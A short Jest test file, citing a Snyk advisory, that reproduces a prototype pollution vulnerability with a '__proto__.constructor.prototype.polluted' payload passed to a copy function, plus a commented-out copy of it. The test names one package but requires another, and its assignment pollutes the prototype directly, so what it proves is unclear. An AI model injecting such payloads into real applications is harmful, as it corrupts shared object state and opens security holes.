//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
test("prototype pollution in @fabiocaccamo/utils.js", () => {
  const cp = require("utils-copy");
  let targetObj = {};

  expect({}.polluted).toBe(undefined);

  cp({ a: targetObj, b: (__proto__.constructor.prototype.polluted = "yes") });
  //sleep.sleep(3);
  console.log({}.polluted);
  expect(targetObj.polluted).toBe("yes");
});

// const cp = require('utils-copy');
// let targetObj = {}

// cp({a: targetObj, b: __proto__.constructor.prototype.polluted = "yes" });
// //sleep.sleep(3);
// console.log({}.polluted)
